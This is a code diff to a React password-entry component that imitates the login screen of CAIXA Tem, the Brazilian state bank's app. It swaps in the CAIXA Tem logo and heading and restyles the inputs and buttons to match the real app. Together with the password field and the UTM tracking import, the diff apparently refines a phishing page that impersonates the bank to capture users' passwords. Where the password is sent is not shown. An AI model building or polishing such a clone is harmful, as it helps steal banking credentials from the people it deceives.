@@ -3,7 +3,7 @@ import { useLocation } from 'wouter';
 import { motion } from 'framer-motion';
 import { Eye, EyeOff } from 'lucide-react';
 import { prepareUrlWithParams } from '../lib/utmHandler';
-import caixaLogo from '@assets/caixa logo.webp';
+import caixaTemLogo from '@assets/logo-caixa-tem.png';
 import helpIcon from '@assets/icone-ajuda webp.webp';
 
 export default function LoginSenha() {
@@ -51,14 +51,14 @@ export default function LoginSenha() {
   return (
     <div className="min-h-screen w-full flex flex-col bg-white text-[#0079c0]">
       <div className="w-full p-8 flex flex-col items-center">
-        {/* Logo CAIXA */}
+        {/* Logo CAIXA TEM */}
         <img 
-          src={caixaLogo} 
-          alt="CAIXA" 
-          className="w-40 h-auto" 
+          src={caixaTemLogo} 
+          alt="CAIXA Tem" 
+          className="w-48 h-auto" 
         />
-        <h2 className="text-[#0079c0] text-xl font-normal mt-1">
-          Aplicativo Caixa Tem
+        <h2 className="text-[#0079c0] text-xl font-normal mt-2">
+          Entrar no CAIXA Tem
         </h2>
       </div>
       
@@ -93,7 +93,7 @@ export default function LoginSenha() {
               value={senha}
               onChange={handleSenhaChange}
               placeholder="Senha"
-              className="w-full bg-transparent border-0 focus:outline-none text-[#0079c0] placeholder-[#0079c0] placeholder-opacity-50 pr-10"
+              className="w-full bg-transparent border-0 focus:outline-none text-[#666666] placeholder-[#999999] placeholder-opacity-50 pr-10"
             />
             <button
               type="button"
@@ -109,7 +109,7 @@ export default function LoginSenha() {
         <div className="grid grid-cols-2 gap-4 mb-8">
           <button
             onClick={handleBack}
-            className="py-4 border border-[#f7a800] text-[#f7a800] font-medium rounded-md transition-colors"
+            className="py-4 border-0 text-[#f7a800] font-medium transition-colors bg-white hover:bg-gray-50"
           >
             Voltar
           </button>
@@ -117,7 +117,7 @@ export default function LoginSenha() {
           <button
             onClick={handleLogin}
             disabled={loading}
-            className="py-4 bg-[#f7a800] hover:bg-[#e59700] text-white font-medium rounded-md transition-colors"
+            className="py-4 bg-[#f7a800] hover:bg-[#e59700] text-white font-medium rounded-none transition-colors"
           >
             {loading ? 'Entrando...' : 'Entrar'}
           </button>
